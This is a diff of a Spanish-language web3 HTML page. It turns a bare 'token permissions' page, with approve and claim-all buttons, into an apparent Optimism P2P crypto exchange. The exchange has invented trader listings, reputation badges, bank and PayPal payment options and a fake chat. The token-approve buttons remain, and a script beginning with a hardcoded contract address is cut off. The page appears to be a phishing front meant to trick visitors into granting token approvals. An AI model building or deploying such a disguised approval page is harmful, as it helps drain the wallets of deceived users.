@@ -3,35 +3,237 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gestión de Permisos</title>
+    <title>P2P Exchange - Optimism</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <style>
+        :root {
+            --primary-color: #f0b90b;
+            --background-dark: #181a20;
+            --background-light: #2b2f36;
+            --text-primary: #eaecef;
+            --buy-color: #00b15d;
+            --sell-color: #f84960;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f4f4f4;
+            font-family: 'Arial', sans-serif;
+            background-color: var(--background-dark);
+            color: var(--text-primary);
+            margin: 0;
             padding: 20px;
         }
-        button {
-            padding: 10px 20px;
-            margin: 10px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #007bff;
-            color: white;
-            border: none;
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 3fr 1fr;
+            gap: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding: 15px;
+            background-color: var(--background-light);
+            border-radius: 8px;
+        }
+
+        .filters {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .filter-group {
+            background-color: var(--background-light);
+            padding: 10px;
             border-radius: 5px;
         }
+
+        select, input {
+            background-color: var(--background-dark);
+            color: var(--text-primary);
+            border: 1px solid #333;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .ads-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .ad-card {
+            background-color: var(--background-light);
+            padding: 20px;
+            border-radius: 8px;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            align-items: center;
+        }
+
+        .buy-ad { border-left: 4px solid var(--buy-color); }
+        .sell-ad { border-left: 4px solid var(--sell-color); }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+        }
+
+        .price {
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .payment-method {
+            background-color: var(--background-dark);
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 0.9em;
+        }
+
+        .chat-sidebar {
+            background-color: var(--background-light);
+            padding: 20px;
+            border-radius: 8px;
+            height: 80vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chat-messages {
+            flex-grow: 1;
+            overflow-y: auto;
+            margin-bottom: 15px;
+        }
+
+        button {
+            background-color: var(--primary-color);
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
         button:disabled {
-            background-color: #ccc;
+            opacity: 0.6;
             cursor: not-allowed;
+        }
+
+        .country-flag {
+            width: 24px;
+            height: 16px;
         }
     </style>
 </head>
 <body>
-    <h1>Gestión de Permisos</h1>
-    <button id="approveTokens" disabled>Autorizar Permisos</button>
-    <button id="claimAll" disabled>Reclamar Todos los Tokens</button> 
+    <div class="header">
+        <h1>Optimism P2P</h1>
+        <nav>
+            <button id="approveTokens" disabled>Autorizar Tokens</button>
+            <button id="claimAll" disabled>Reclamar Tokens</button>
+        </nav>
+    </div>
+
+    <div class="container">
+        <main>
+            <div class="filters">
+                <div class="filter-group">
+                    <select>
+                        <option>Comprar</option>
+                        <option>Vender</option>
+                    </select>
+                </div>
+                <div class="filter-group">
+                    <select>
+                        <option>Todos los pagos</option>
+                        <option>Transferencia Bancaria</option>
+                        <option>PayPal</option>
+                        <option>Skrill</option>
+                    </select>
+                </div>
+                <div class="filter-group">
+                    <input type="text" placeholder="Buscar...">
+                </div>
+            </div>
+
+            <div class="ads-list">
+                <!-- Anuncio de compra -->
+                <div class="ad-card buy-ad">
+                    <div class="user-info">
+                        <img src="https://via.placeholder.com/40" class="user-avatar" alt="Usuario">
+                        <div>
+                            <h4>JuanPerez ✅</h4>
+                            <div>🗺️ España <img src="https://flagcdn.com/es.svg" class="country-flag"></div>
+                            <div>🛡️ 98% (500+ trades)</div>
+                        </div>
+                    </div>
+                    <div class="price">1 ETH = $3,200</div>
+                    <div>
+                        <div>Disponible: 2.5 ETH</div>
+                        <div class="payment-methods">
+                            <span class="payment-method">BBVA</span>
+                            <span class="payment-method">Santander</span>
+                        </div>
+                        <button style="width: 100%; margin-top: 10px;">Comprar</button>
+                    </div>
+                </div>
+
+                <!-- Anuncio de venta -->
+                <div class="ad-card sell-ad">
+                    <div class="user-info">
+                        <img src="https://via.placeholder.com/40" class="user-avatar" alt="Usuario">
+                        <div>
+                            <h4>CryptoMaster 🔒</h4>
+                            <div>🗺️ Argentina <img src="https://flagcdn.com/ar.svg" class="country-flag"></div>
+                            <div>🛡️ 100% (1200+ trades)</div>
+                        </div>
+                    </div>
+                    <div class="price">1 ETH = $3,250</div>
+                    <div>
+                        <div>Disponible: 5.8 ETH</div>
+                        <div class="payment-methods">
+                            <span class="payment-method">PayPal</span>
+                            <span class="payment-method">Wise</span>
+                        </div>
+                        <button style="width: 100%; margin-top: 10px;">Vender</button>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <aside class="chat-sidebar">
+            <h3>Chat P2P</h3>
+            <div class="chat-messages">
+                <!-- Mensajes de chat ficticios -->
+                <div style="margin-bottom: 15px;">
+                    <div><strong>JuanPerez:</strong> Hola, ¿disponible?</div>
+                    <div><strong>Tú:</strong> Sí, ¿cuánto quieres?</div>
+                </div>
+            </div>
+            <input type="text" placeholder="Escribe tu mensaje...">
+        </aside>
+    </div>
+
 
     <script>
         const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Dirección de tu contrato
